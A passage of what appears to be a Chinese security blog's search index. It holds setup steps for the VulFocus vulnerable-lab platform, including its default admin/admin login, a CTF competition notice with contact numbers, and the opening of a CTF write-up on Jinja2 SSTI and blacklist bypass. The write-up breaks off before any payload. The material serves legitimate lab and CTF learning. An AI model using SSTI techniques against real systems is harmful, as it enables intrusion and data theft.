title="五、管理靶场镜像"></a>五、管理靶场镜像</h2><p>可以在首页对下载的靶场进行进行管理，可以启动、停止或者删除靶场镜像</p><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/VulFocus%E9%9D%B6%E5%9C%BA%E9%95%9C%E5%83%8F%E7%AE%A1%E7%90%86.png" alt="VulFocus靶场镜像管理"></p><h2 id="六、访问靶场-虚拟机"><a href="#六、访问靶场-虚拟机" class="headerlink" title="六、访问靶场(虚拟机)"></a>六、访问靶场(虚拟机)</h2><p>这里我有点搞不明白，他分配的IP地址以及端口，在我的机子上是没办法访问的，但是从靶场管理那里分配的IP访问是OK的，奇奇怪怪</p><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/%E5%88%86%E9%85%8DIP%E8%AE%BF%E9%97%AE%E6%8A%A5%E9%94%99.png" alt="VulFocus靶场访问报错"></p><ol><li>正常的访问方式为: <em><strong>分配的IP地址:分配的端口</strong></em></li></ol><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/VulFocus%E9%9D%B6%E5%9C%BA%E9%95%9C%E5%83%8F%E6%AD%A3%E5%B8%B8%E8%AE%BF%E9%97%AE(%E8%99%9A%E6%8B%9F%E6%9C%BA).png" alt="VulFocus靶场正常访问"></p><ol start="2"><li>稳妥的访问方式：<em><strong>本机IP:分配端口</strong></em></li></ol><p><img src="/../../media/img/essay/VulFocus%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/VulFocus%E9%9D%B6%E5%9C%BA%E9%95%9C%E5%83%8F%E7%A8%B3%E5%A6%A5%E8%AE%BF%E9%97%AE(%E8%99%9A%E6%8B%9F%E6%9C%BA).png" alt="VulFocus靶场稳妥访问"></p><h2 id="七、访问靶场-本地物理机"><a href="#七、访问靶场-本地物理机" class="headerlink" title="七、访问靶场(本地物理机)"></a>七、访问靶场(本地物理机)</h2><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> VulFocus </category>
          
          <category> 靶场 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VulFocus </tag>
            
            <tag> 靶场 </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7换源</title>
      <link href="/post/d8c7bf5a/"/>
      <url>/post/d8c7bf5a/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> CentOS </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulFocus-CTF平台搭建</title>
      <link href="/post/a456a6ae/"/>
      <url>/post/a456a6ae/</url>
      
        <content type="html"><![CDATA[<h1 id="VulFocus-CTF平台搭建详细教程"><a href="#VulFocus-CTF平台搭建详细教程" class="headerlink" title="VulFocus-CTF平台搭建详细教程"></a>VulFocus-CTF平台搭建详细教程</h1><p>VulFocus 是一款专注于漏洞环境测试的开源平台，提供了丰富的漏洞环境镜像，方便用户学习、研究、测试漏洞利用与防御。以下是从环境准备到部署完成的详细搭建教程。</p><hr><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="1-服务器配置"><a href="#1-服务器配置" class="headerlink" title="1. 服务器配置"></a>1. 服务器配置</h3><ul><li><strong>操作系统</strong>: Ubuntu 20.04+ 或 CentOS 7+</li><li><strong>硬件要求</strong>:<ul><li>内存：≥4 GB</li><li>硬盘：≥50 GB</li><li>CPU：2 核及以上</li></ul></li></ul><h3 id="2-必要依赖"><a href="#2-必要依赖" class="headerlink" title="2. 必要依赖"></a>2. 必要依赖</h3><p>确保以下工具已在虚拟机中安装：</p><ul><li>Docker：≥20.10</li><li>Docker-Compose：≥1.25</li><li>Git</li></ul><h3 id="3-网络要求"><a href="#3-网络要求" class="headerlink" title="3. 网络要求"></a>3. 网络要求</h3><ul><li>保证服务器可访问外网，以下载所需的依赖和镜像。</li><li>配置防火墙允许必要的端口（默认 8080）。</li></ul><hr><h2 id="二、安装步骤"><a href="#二、安装步骤" class="headerlink" title="二、安装步骤"></a>二、安装步骤</h2><h3 id="（一）-安装-Docker-和-Docker-Compose"><a href="#（一）-安装-Docker-和-Docker-Compose" class="headerlink" title="（一） 安装 Docker 和 Docker-Compose"></a>（一） 安装 Docker 和 Docker-Compose</h3><h3 id="在开始之前，建议大家先去看看"><a href="#在开始之前，建议大家先去看看" class="headerlink" title="在开始之前，建议大家先去看看 "></a>在开始之前，建议大家先去看看 <a href="/post/d8c7bf5a/" title="CentOS7换源">[CentOS换源教程]</a></h3><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><ol><li><strong>更新包管理器</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>安装 Docker</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y docker.io</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker</span><br><span class="line"><span class="built_in">sudo</span> systemctl start docker</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>安装 Docker-Compose</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>验证安装版本</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker --version</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><ol><li><strong>安装依赖</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install -y yum-utils</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>配置 Docker 官方源</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>安装 Docker</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker</span><br><span class="line"><span class="built_in">sudo</span> systemctl start docker</span><br></pre></td></tr></table></figure><ol start="4"><li><strong>安装 Docker-Compose</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><ol start="5"><li>验证安装版本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker --version</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h3 id="（二）-方法一：Docker-Compose安装"><a href="#（二）-方法一：Docker-Compose安装" class="headerlink" title="（二） 方法一：Docker-Compose安装"></a>（二） 方法一：Docker-Compose安装</h3><ol start="0"><li><strong>准备工作</strong></li></ol><ul><li>在<em><strong>根目录‘&#x2F;’<em><strong>下创建</strong></em>data目录</strong></em></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /data/</span><br></pre></td></tr></table></figure><ol><li><strong>克隆 VulFocus 仓库</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/fofapro/vulfocus.git vulfocus_web</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>修改docker-compose.yml配置文件</strong><br>修改关键点-环境运行IP:<em><strong>VUL_IP</strong></em></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/vulfocus_web</span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="attr">REDIS_HOST:</span> <span class="string">redis</span></span><br><span class="line">  <span class="attr">REDIS_PORT:</span> <span class="number">6379</span></span><br><span class="line">  <span class="attr">REDIS_PASS:</span> <span class="string">vuldocus</span></span><br><span class="line">  <span class="attr">VUL_IP:</span> <span class="string">本机IP地址</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>启动项目</strong></li></ol><ul><li>运行该命令时，需要位于克隆的vulfocus目录下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p>！！注意！！首次搭建需要拉取镜像进行安装，需要<em><strong>配置镜像加速</strong></em></p><ol start="4"><li><strong>访问项目</strong></li></ol><ul><li>浏览器地址栏输入配置好的本机IP即可访问vulfocus服务</li></ul><h3 id="（三）-方法二：Docker镜像安装"><a href="#（三）-方法二：Docker镜像安装" class="headerlink" title="（三） 方法二：Docker镜像安装"></a>（三） 方法二：Docker镜像安装</h3><ol><li><strong>拉取docker镜像</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>启动项目</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker create -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=xxx.xxx.xxx.xxx -e EMAIL_HOST=<span class="string">&quot;xxx.xxx.xxx&quot;</span> -e EMAIL_HOST_USER=<span class="string">&quot;xxx@xxx.com&quot;</span> -e EMAIL_HOST_PASSWORD=<span class="string">&quot;xxxxxxxx&quot;</span> vulfocus/vulfocus</span><br><span class="line">docker start container <span class="built_in">id</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=xxx.xxx.xxx.xxx -e EMAIL_HOST=<span class="string">&quot;xxx.xxx.xxx&quot;</span> -e EMAIL_HOST_USER=<span class="string">&quot;xxx@xxx.com&quot;</span> -e EMAIL_HOST_PASSWORD=<span class="string">&quot;xxxxxxxx&quot;</span> vulfocus/vulfocus</span><br></pre></td></tr></table></figure><h4 id="命令参数解释"><a href="#命令参数解释" class="headerlink" title="命令参数解释"></a>命令参数解释</h4><ul><li>-v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock 为 docker 交互连接。</li><li>-e DOCKER_URL 为 Docker 连接方式，默认通过 unix:&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock 进行连接，也可以通过 tcp:&#x2F;&#x2F;xxx.xxx.xxx.xxx:2375 进行连接（必须开放 2375 端口）。</li><li>-v &#x2F;vulfocus-api&#x2F;db.sqlite3:db.sqlite3 映射数据库为本地文件。</li><li>-e VUL_IP&#x3D;xxx.xxx.xxx.xxx 为 Docker 服务器 IP ，不能为 127.0.0.1。</li><li>-e EMAIL_HOST&#x3D;”xxx.xxx.xxx” 为邮箱SMTP服务器</li><li>-e EMAIL_HOST_USER&#x3D;”<a href="mailto:&#120;&#x78;&#x78;&#64;&#120;&#120;&#120;&#x2e;&#99;&#111;&#x6d;">xxx@xxx.com</a>“ 为邮箱账号</li><li>-e EMAIL_HOST_PASSWORD&#x3D;”xxxxxxxx 为邮箱密码</li></ul><ol start="3"><li><strong>访问项目</strong></li></ol><ul><li>浏览器地址栏输入配置好的本机IP即可访问vulfocus服务</li></ul><h3 id="默认账户密码-admin-admin"><a href="#默认账户密码-admin-admin" class="headerlink" title="默认账户密码 admin&#x2F;admin"></a>默认账户密码 <em><strong>admin&#x2F;admin</strong></em></h3><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> VulFocus </category>
          
          <category> 靶场 </category>
          
          <category> CTF平台 </category>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> VulFocus </tag>
            
            <tag> 靶场 </tag>
            
            <tag> 教程 </tag>
            
            <tag> CTF平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulFocus-CTF平台简介</title>
      <link href="/post/735f6e02/"/>
      <url>/post/735f6e02/</url>
      
        <content type="html"><![CDATA[<h1 id="VulFocus简介"><a href="#VulFocus简介" class="headerlink" title="VulFocus简介"></a>VulFocus简介</h1><p>VulFocus 是一款专注于漏洞环境管理的开源平台，由 <strong>FOFA 团队</strong> 开发并维护。<br>它旨在为安全研究人员、渗透测试工程师以及网络安全爱好者提供一个高效便捷的漏洞学习和实践平台。<br>通过 VulFocus，用户可以<strong>快速部署</strong>、<strong>管理漏洞环境镜像</strong>，用于<strong>漏洞研究</strong>、<strong>渗透测试</strong>以及<strong>防御策略验证</strong>。</p><hr><h2 id="一、核心特点"><a href="#一、核心特点" class="headerlink" title="一、核心特点"></a>一、核心特点</h2><ol><li><p><strong>丰富的漏洞镜像库</strong><br>VulFocus 提供了上百种常见漏洞的容器化镜像，包括但不限于 Web 应用漏洞、数据库漏洞、操作系统漏洞等，涵盖多种漏洞场景和利用方式。</p></li><li><p><strong>一键部署与管理</strong><br>借助 Docker 技术，用户可以通过一键部署快速启动和管理漏洞环境，无需复杂的配置过程。</p></li><li><p><strong>安全隔离</strong><br>利用 Docker 容器技术，每个漏洞环境都在独立的容器中运行，确保测试环境与真实系统完全隔离，减少安全风险。</p></li><li><p><strong>开源与扩展性</strong><br>VulFocus 开源且社区活跃，用户可以根据需求定制化漏洞环境，也可以贡献自己的漏洞镜像。</p></li><li><p><strong>多用途支持</strong></p><ul><li><strong>漏洞复现</strong>: 用于学习和验证漏洞原理。</li><li><strong>攻防演练</strong>: 为安全团队提供攻防演练环境。</li><li><strong>工具测试</strong>: 评估安全工具的漏洞检测能力。</li></ul></li></ol><hr><h2 id="二、适用场景"><a href="#二、适用场景" class="headerlink" title="二、适用场景"></a>二、适用场景</h2><ol><li><p><strong>漏洞复现与学习</strong><br>学习各种漏洞的原理、触发条件和利用方式。</p></li><li><p><strong>攻防演练与实战模拟</strong><br>模拟真实的攻击与防御场景，为企业网络安全能力提升提供支持。</p></li><li><p><strong>安全工具评估</strong><br>测试漏洞扫描器、入侵检测系统等工具的准确性和覆盖范围。</p></li><li><p><strong>研究与开发</strong><br>为安全研究人员提供一个便捷的平台，用于测试新型攻击方法或防御机制。</p></li></ol><hr><h2 id="三、平台优势"><a href="#三、平台优势" class="headerlink" title="三、平台优势"></a>三、平台优势</h2><ol><li><p><strong>丰富的漏洞镜像库</strong><br>VulFocus 提供了上百种常见漏洞的容器化镜像，包括但不限于 Web 应用漏洞、数据库漏洞、操作系统漏洞等，涵盖多种漏洞场景和利用方式。</p></li><li><p><strong>一键部署与管理</strong><br>借助 Docker 技术，用户可以通过一键部署快速启动和管理漏洞环境，无需复杂的配置过程。</p></li><li><p><strong>安全隔离</strong><br>利用 Docker 容器技术，每个漏洞环境都在独立的容器中运行，确保测试环境与真实系统完全隔离，减少安全风险。</p></li><li><p><strong>开源与扩展性</strong><br>VulFocus 开源且社区活跃，用户可以根据需求定制化漏洞环境，也可以贡献自己的漏洞镜像。</p></li><li><p><strong>活跃社区支持</strong><br>拥有庞大的用户社区和文档支持，便于快速上手和解决问题。</p></li></ol><h2 id="四、技术栈"><a href="#四、技术栈" class="headerlink" title="四、技术栈"></a>四、技术栈</h2><ol><li><strong>Docker</strong>: 提供轻量级容器化环境，支持快速部署和运行。</li><li><strong>Nginx</strong>: 作为 HTTP 服务器，提供漏洞环境的访问入口。</li><li><strong>Python</strong>: 平台后端核心代码，负责环境调度和管理。</li><li><strong>MySQL</strong>: 存储用户和镜像相关数据。</li><li><strong>Redis</strong>: 作为缓存服务，提高用户体验。</li><li><strong>Vue.js</strong>: 前端用户界面，提供漏洞环境配置和管理界面。</li></ol><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> VulFocus </category>
          
          <category> 靶场 </category>
          
          <category> CTF平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> VulFocus </tag>
            
            <tag> 靶场 </tag>
            
            <tag> CTF平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年“楚慧杯”网络空间安全实践能力竞赛介绍</title>
      <link href="/post/9876484b/"/>
      <url>/post/9876484b/</url>
      
        <content type="html"><![CDATA[<h1 id="2024年“楚慧杯”网络空间安全实践能力竞赛详细介绍"><a href="#2024年“楚慧杯”网络空间安全实践能力竞赛详细介绍" class="headerlink" title="2024年“楚慧杯”网络空间安全实践能力竞赛详细介绍"></a>2024年“楚慧杯”网络空间安全实践能力竞赛详细介绍</h1><h2 id="一、大赛背景与目的"><a href="#一、大赛背景与目的" class="headerlink" title="一、大赛背景与目的"></a>一、大赛背景与目的</h2><p><img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExOTNva29oajNtZGx6N3kzMXg5ZjR6MTBydW9icnM1cWJxNzdkMmRsMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/57ZvMMkuBIVMlU88Yh/giphy.gif" alt="CTF"></p><p>为全面贯彻落实习近平总书记关于网络强国的重要思想，进一步提升全社会网络安全意识与技能，加强我省构建新发展格局先行区相关人才队伍储备，推动国家网络安全人才与创新基地高质量发展，特举办首届基地“楚慧杯”网络空间安全实践能力竞赛。</p><h2 id="二、参赛组别"><a href="#二、参赛组别" class="headerlink" title="二、参赛组别"></a>二、参赛组别</h2><p>本届大赛分为四个组别：</p><ul><li>W组：省直机关企事业单位（含中央垂管及驻汉单位）相关从业人员；</li><li>L组：普通高等及职业院校在校学生（含研究生）；</li><li>A组：国内相关专业机构从业人员；</li><li>Q组：国内相关技术爱好者。</li></ul><h2 id="三、奖项设置"><a href="#三、奖项设置" class="headerlink" title="三、奖项设置"></a>三、奖项设置</h2><p>竞赛将在12月下旬举行闭幕暨颁奖仪式，为优胜队伍及个人颁发荣誉证书与奖品。奖项包括：</p><ul><li>特等奖1名；</li><li>一等奖3名；</li><li>二等奖5名；</li><li>优胜奖7名；</li><li>预赛优胜奖：根据预赛成绩和参与度情况，对各组别表现优异的若干队伍进行奖励（证书奖励）；</li><li>决赛优胜奖：根据决赛成绩和参与度情况，对表现优异的若干队伍进行奖励（证书奖励）。</li></ul><h2 id="四、计划安排"><a href="#四、计划安排" class="headerlink" title="四、计划安排"></a>四、计划安排</h2><ul><li>预赛报名截止时间：12月17日（星期二）；</li><li>启动会：12月18日，将在湖北大学举办；</li><li>预赛：12月20日（星期五），线上进行(9:00 - 17:00)；</li><li>决赛：12月28日（拟定），将在国家网安基地举办；</li><li>颁奖仪式：12月28日（拟定），将在国家网安基地举办。</li></ul><h2 id="五、竞赛形式"><a href="#五、竞赛形式" class="headerlink" title="五、竞赛形式"></a>五、竞赛形式</h2><ul><li>预赛：CTF解题赛模式，预赛成绩不计入决赛；</li><li>决赛：Break &amp; Fix攻防赛（AWDP）模式。</li></ul><h2 id="六、赛题介绍"><a href="#六、赛题介绍" class="headerlink" title="六、赛题介绍"></a>六、赛题介绍</h2><h3 id="预赛赛题形式：CTF解题模式"><a href="#预赛赛题形式：CTF解题模式" class="headerlink" title="预赛赛题形式：CTF解题模式"></a>预赛赛题形式：CTF解题模式</h3><p>预赛采用主流CTF夺旗赛模式，通过竞赛平台提供WEB、CRYPTO、PWN、REVERSE、MISC等类型的赛题。设置动态积分制，考验选手的解题速度和策略调整能力。</p><h3 id="决赛赛题形式：AWDP（Break-Fix）攻防赛模式"><a href="#决赛赛题形式：AWDP（Break-Fix）攻防赛模式" class="headerlink" title="决赛赛题形式：AWDP（Break+Fix）攻防赛模式"></a>决赛赛题形式：AWDP（Break+Fix）攻防赛模式</h3><p>决赛把新颖的AWDP（Break+Fix）攻防赛融入竞技环节，使得竞赛更具全面性和挑战性。所有参赛队伍均通过统一平台进行竞赛，对渗透能力和防护能力进行综合全面的考量。</p><h3 id="赛题设计特点："><a href="#赛题设计特点：" class="headerlink" title="赛题设计特点："></a>赛题设计特点：</h3><p>赛题设计科学合理，注重实践实战，为参赛选手提供了锻炼攻防实战能力、提高专业技能的绝佳学习交流机会。</p><h3 id="赛题难度与挑战性："><a href="#赛题难度与挑战性：" class="headerlink" title="赛题难度与挑战性："></a>赛题难度与挑战性：</h3><p>赛题设置旨在汇聚全省乃至全国网络安全精英同台竞技，确保竞赛的挑战性和高水平。</p><h3 id="赛题的安全性与可控性："><a href="#赛题的安全性与可控性：" class="headerlink" title="赛题的安全性与可控性："></a>赛题的安全性与可控性：</h3><p>竞赛遵循统一标准、安全可控的原则，确保赛事的顺利进行。</p><h2 id="七、组织架构"><a href="#七、组织架构" class="headerlink" title="七、组织架构"></a>七、组织架构</h2><p>主办单位：湖北省委网信办、湖北省教育厅、湖北省公安厅、湖北省通信管理局。承办单位、协办单位及支持单位待定。</p><h2 id="八、其他事项"><a href="#八、其他事项" class="headerlink" title="八、其他事项"></a>八、其他事项</h2><ul><li>竞赛及相关活动须服从国家相关政治经济大局，如因相关因素涉及具体调整，组委会将另行通知；</li><li>竞赛期间未经组委会批准，参赛单位及个人不得接受任何媒体关于竞赛相关内容的采访，不得私自公开竞赛相关资料和数据，违者追究其相关责任；</li><li>参赛期间食宿交通费用自理；</li><li>竞赛的最终解释权归组委会，本通知未尽事宜由组委会另行发布。</li></ul><h2 id="九、联系方式"><a href="#九、联系方式" class="headerlink" title="九、联系方式"></a>九、联系方式</h2><p>竞赛官网：<a href="http://2024chuhuibei.hbinsa.org.cn/">http://2024chuhuibei.hbinsa.org.cn/</a></p><p>报名邮箱：<a href="mailto:&#50;&#x30;&#x32;&#52;&#x63;&#104;&#117;&#104;&#x75;&#105;&#98;&#x65;&#105;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#x6f;&#109;">2024chuhuibei@163.com</a></p><p>详细咨询：</p><ul><li>郑老师（19107134108）</li><li>汤老师（13871022012）</li><li>张老师（15927625325）</li><li>宋老师（18986089879）</li></ul><p><img src="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExZ2FqdTFqMTh5b3l5bXE2NnJ0ZXU2d2Q0aWtzbmxvbXRwcWF5YTBhZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/11sBLVxNs7v6WA/giphy.gif" alt="CTF"></p><p>以上是2024年“楚慧杯”网络空间安全实践能力竞赛的综合详细介绍，供您参考。期待您的参与，让我们共同见证网络安全领域的精彩对决！</p><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10/dist/style.css"><script src="https://fastly.jsdelivr.net/npm/d3@7"></script><script src="https://fastly.jsdelivr.net/npm/markmap-view@0.18.10"></script><script src="https://fastly.jsdelivr.net/npm/markmap-toolbar@0.18.10"></script><link rel="stylesheet" href="/css/markmap.css"><script src="/js/markmap.js"></script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
            <tag> CTF </tag>
            
            <tag> 国内竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届‘长城杯’WEB篇—Safe_Prosy</title>
      <link href="/post/bb81c461/"/>
      <url>/post/bb81c461/</url>
      
        <content type="html"><![CDATA[<h1 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h1><h2 id="一、-前言：简单介绍SSTI"><a href="#一、-前言：简单介绍SSTI" class="headerlink" title="一、 前言：简单介绍SSTI"></a>一、 前言：简单介绍SSTI</h2><p>SSTI（Server-Side Template Injection，服务器端模板注入）是一种常见的 Web 安全漏洞，发生在 Web 应用程序在服务器端使用模板引擎渲染动态内容时。<br>攻击者通过向应用程序的模板输入中注入恶意的模板语法，从而能够执行任意的代码或命令，甚至获取应用服务器上的敏感信息。</p><h3 id="（一）-SSTI工作原理"><a href="#（一）-SSTI工作原理" class="headerlink" title="（一） SSTI工作原理"></a>（一） SSTI工作原理</h3><p>许多 Web 应用程序都使用模板引擎（例如 Jinja2、Thymeleaf、FreeMarker 等）来生成动态 HTML 内容。<br>模板引擎通过模板语法将变量和控制结构嵌入到静态 HTML 中。SSTI 漏洞通常出现在 Web 应用没有对用户输入进行充分过滤时，攻击者可以将恶意代码注入到模板渲染过程中。<br>攻击者通过构造包含恶意模板代码的输入，服务器端的模板引擎在渲染时会执行这些代码，导致潜在的代码执行或信息泄露。</p><h3 id="（二）-SSTI常见攻击"><a href="#（二）-SSTI常见攻击" class="headerlink" title="（二） SSTI常见攻击"></a>（二） SSTI常见攻击</h3><ol><li>代码执行</li></ol><p>攻击者可以注入特定的模板语法（如 Jinja2 或其他引擎的语法），通过模板引擎的执行环境运行恶意代码，执行服务器上的任意操作，例如读取文件、执行系统命令等。</p><ol start="2"><li>信息泄露</li></ol><p>攻击者可以通过模板注入获取 Web 应用服务器的一些敏感信息，例如环境变量、配置文件、数据库信息等。<br>这通常是通过泄露内存中的对象、类或函数信息来实现的。</p><ol start="3"><li>绕过访问控制</li></ol><p>在某些情况下，攻击者可以利用 SSTI 漏洞绕过 Web 应用的认证或授权机制，访问通常不允许访问的页面或功能。</p><h3 id="（三）-常见的模板引擎"><a href="#（三）-常见的模板引擎" class="headerlink" title="（三） 常见的模板引擎"></a>（三） 常见的模板引擎</h3><ul><li>Jinja2（Python）</li><li>Thymeleaf（Java）</li><li>FreeMarker（Java）</li><li>Handlebars（JavaScript）</li><li>Mustache（多语言）</li></ul><h2 id="二、-题目分析"><a href="#二、-题目分析" class="headerlink" title="二、 题目分析"></a>二、 题目分析</h2><ol><li>关键点分析</li></ol><ul><li>这道题考的就是<em><strong>SSTI注入</strong></em>，waf的东西不是很多，</li><li>主要的一个关键点就是<em><strong>绕过黑名单</strong></em></li><li>给的python代码，显然题目用的就是<em><strong>Jinja2模板引擎</strong></em></li></ul><ol start="2"><li>代码分析</li></ol><p>拿到题目后，给了段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 